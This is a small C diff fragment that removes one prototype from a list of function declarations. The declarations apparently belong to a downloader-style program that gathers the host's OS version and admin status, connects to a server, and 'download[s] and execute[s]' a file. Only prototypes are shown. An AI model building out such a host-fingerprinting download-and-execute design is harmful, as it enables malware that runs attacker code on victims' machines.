@@ -12,7 +12,6 @@ void adminyn(char* pc);
 void connect_server(SOCKET* s,char* pc,char* version); // connect to page and get 
 void download(char* server_reply); // download and execute file
 void os_version(char* version);
-void computer_name(TCHAR * computername);
 void freeme();
 int main()
 {	
